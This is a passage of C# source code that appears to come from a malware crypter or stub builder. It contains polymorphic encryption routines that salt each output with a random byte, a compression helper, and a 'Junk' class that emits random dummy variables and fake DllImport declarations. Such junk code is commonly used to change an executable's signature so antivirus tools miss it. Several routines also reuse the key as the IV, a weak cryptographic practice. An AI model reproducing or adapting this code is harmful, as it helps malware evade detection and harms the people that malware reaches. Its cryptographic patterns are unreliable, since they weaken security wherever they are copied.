            SymmetricAlgorithm rijn = SymmetricAlgorithm.Create();
            MemoryStream ms = new MemoryStream();
            byte[] key = Encoding.ASCII.GetBytes(Key);
            byte[] rgbIV = key;
            CryptoStream cs = new CryptoStream(ms, rijn.CreateEncryptor(key, rgbIV), CryptoStreamMode.Write);
            cs.Write(bytes, 0, bytes.Length);
            cs.Close();
            return ms.ToArray();
        }
        public static byte[] PolyRC2Encrypt(byte[] bytes, string Key)
        {
            byte[] byteKey = Encoding.ASCII.GetBytes(Key);
            byte[] byteIV = byteKey;
            Array.Resize(ref bytes, bytes.Length + 1);
            bytes[bytes.Length - 1] = (byte)new Random().Next(0, 255);
            MemoryStream MS = new MemoryStream();
            RC2CryptoServiceProvider CryptoMethod = new RC2CryptoServiceProvider();
            CryptoStream CS = new CryptoStream(MS, CryptoMethod.CreateEncryptor(byteKey, byteIV), CryptoStreamMode.Write);
            CS.Write(bytes, 0, bytes.Length);
            CS.FlushFinalBlock();
            return MS.ToArray();
        }
        public static byte[] PolyDexEncrypt(byte[] plain, string Key)
        {
            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
            byte[] expandedKey;
            byte[] dKey = key;
            int length = plain.Length;
            if (dKey.Length >= length) expandedKey = dKey;
            else
            {
                byte[] rconst = BitConverter.GetBytes(Math.Round(Math.PI, 3));
                byte[] result = new byte[length];
                Buffer.BlockCopy(dKey, 0, result, 0, dKey.Length);
                for (int i = dKey.Length; i < length; i++)
                    result[i] = (byte)((dKey[(i - dKey.Length) % dKey.Length] ^ (result[i - 1])) % 256);
                for (int round = 0; round < 5; round++)
                {
                    result[0] = (byte)(result[0] ^ rconst[round]);
                    for (int i = 1; i < result.Length; i++)
                        result[i] = (byte)(((result[i] ^ (byte)(rconst[round] << (i % 3))) ^ result[i - 1]) % 256);
                }
                expandedKey = result;
            }
            byte[] wholeState = plain;
            byte magic = (byte)new Random().Next(byte.MaxValue);
            Array.Resize(ref wholeState, plain.Length + 1);
            wholeState[wholeState.Length - 1] = magic;
            for (int i = 0; i < wholeState.Length - 1; i++) wholeState[i] = (byte)(wholeState[i] ^ expandedKey[i] ^ magic);
            return wholeState;
        }
        //Copyright (C) 2011, Dextrey (0xDEADDEAD)
        public static byte[] PolyAESEncrypt(byte[] plainText, string Key)
        {
            byte[] salt;
            SymmetricAlgorithm algo = new RijndaelManaged();
            RNGCryptoServiceProvider rngAlgo = new RNGCryptoServiceProvider();
            algo.Mode = CipherMode.CBC;
            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);

            algo.GenerateIV();
            salt = new byte[32];
            rngAlgo.GetBytes(salt);
            Rfc2898DeriveBytes pwDeriveAlg = new Rfc2898DeriveBytes(key, salt, 2000);
            algo.Key = pwDeriveAlg.GetBytes(32);

            ICryptoTransform encTransform = algo.CreateEncryptor();

            byte[] enced = encTransform.TransformFinalBlock(plainText, 0, plainText.Length);

            int origLength = enced.Length;
            Array.Resize(ref enced, enced.Length + salt.Length);
            Buffer.BlockCopy(salt, 0, enced, origLength, salt.Length);

            origLength = enced.Length;
            Array.Resize(ref enced, enced.Length + algo.IV.Length);
            Buffer.BlockCopy(algo.IV, 0, enced, origLength, algo.IV.Length);

            return enced;
        }

        public static byte[] CompressionCompress(byte[] buffer)
        {
            MemoryStream ms = new MemoryStream();
            GZipStream zip = new GZipStream(ms, CompressionMode.Compress, true);
            zip.Write(buffer, 0, buffer.Length);
            zip.Close();
            ms.Position = 0;

            MemoryStream outStream = new MemoryStream();

            byte[] compressed = new byte[ms.Length];
            ms.Read(compressed, 0, compressed.Length);

            byte[] gzBuffer = new byte[compressed.Length + 4];
            Buffer.BlockCopy(compressed, 0, gzBuffer, 4, compressed.Length);
            Buffer.BlockCopy(BitConverter.GetBytes(buffer.Length), 0, gzBuffer, 0, 4);
            return gzBuffer;
        }
    }

    public class Junk
    {
        public static string GenerateJunk(int HowMany, bool Arrays, int Length, bool VagueVars)
        {
            string[] Options = {"string", "int", "long", "double", "decimal", "IntPtr", "StringComparer", "Array", "Attribute", "bool",
                                   "byte", "char", "Boolean"};
            if (Arrays)
            {
                Options = new string[]{ "string", "int", "long", "double", "decimal", "IntPtr", "string[]", "int[]",
                "long[]", "double[]", "decimal[]", "IntPtr[]", "StringComparer", "Array", "Attribute", 
                "bool", "bool[]", "byte", "byte[]", "char", "char[]", "Boolean", "Boolean[]"};
            }

            if (VagueVars)
            {
                Options = new string[]{"AccessViolationException", "ActivationContext", "Activator", "AppDomain", 
                    "AppDomainManager", "AppDomainSetup", "AppDomainUnloadedException", "ApplicationException", 
                    "ApplicationId", "ApplicationIdentity", "ArgIterator", "ArgumentException", "ArgumentNullException",
                    "string", "int", "long", "double", "decimal", "IntPtr", "string[]", "int[]",
                    "long[]", "double[]", "decimal[]", "IntPtr[]", "StringComparer", "Array", "Attribute", 
                    "bool", "bool[]", "byte", "byte[]", "char", "char[]", "Boolean", "Boolean[]"};
            }

            string ToReturn = "";
            for (int i = 0; i < HowMany; i++)
            {
                ToReturn += Options[r.Next(0, Options.Length)] + " " + RndString(Length) + ";\r\n";
            }
            return ToReturn;
        }
        public static string GenerateAPIs(int HowMany, int Length, bool Arrays, bool VagueVars)
        {
            string[] Options = {"string", "int", "long", "double", "decimal", "IntPtr", "StringComparer", "Array", "Attribute", "bool",
                                   "byte", "char", "Boolean"};
            if (Arrays)
            {
                Options = new string[]{ "string", "int", "long", "double", "decimal", "IntPtr", "string[]", "int[]",
                "long[]", "double[]", "decimal[]", "IntPtr[]", "StringComparer", "Array", "Attribute", 
                "bool", "bool[]", "byte", "byte[]", "char", "char[]", "Boolean", "Boolean[]"};
            }

            if (VagueVars)
            {
                Options = new string[]{"AccessViolationException", "ActivationContext", "Activator", "AppDomain", 
                    "AppDomainManager", "AppDomainSetup", "AppDomainUnloadedException", "ApplicationException", 
                    "ApplicationId", "ApplicationIdentity", "ArgumentException", "ArgumentNullException",
                    "string", "int", "long", "double", "decimal", "IntPtr", "string[]", "int[]",
                    "long[]", "double[]", "decimal[]", "IntPtr[]", "StringComparer", "Array", "Attribute", 
                    "bool", "bool[]", "byte", "byte[]", "char", "char[]", "Boolean", "Boolean[]"};
            }

            string API = "[DllImport(\"[DLL].dll\")] static extern [TYPE] [NAME]([PARAM1], [PARAM2]);";
            string ToReturn = "";
            for (int i = 0; i < HowMany; i++)
            {
                string OneDLL = API;
                OneDLL = OneDLL.Replace("[DLL]", RndString(Length));
                OneDLL = OneDLL.Replace("[TYPE]", Options[r.Next(0, Options.Length)]);
                OneDLL = OneDLL.Replace("[NAME]", RndString(Length));
                OneDLL = OneDLL.Replace("[PARAM1]", Options[r.Next(0, Options.Length)] + " " + RndString(Length));
                OneDLL = OneDLL.Replace("[PARAM2]", Options[r.Next(0, Options.Length)] + " " + RndString(Length));
                ToReturn += OneDLL + "\r\n";
            }
            return ToReturn;
        }
        private static string RndString(int HowMany)
        {
            string all = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
            string returnme = "";
            for (int i = 0; i < HowMany; i++) returnme += all[r.Next(0, all.Length)];
            return returnme;
        }
        static Random r = new Random();
    }
}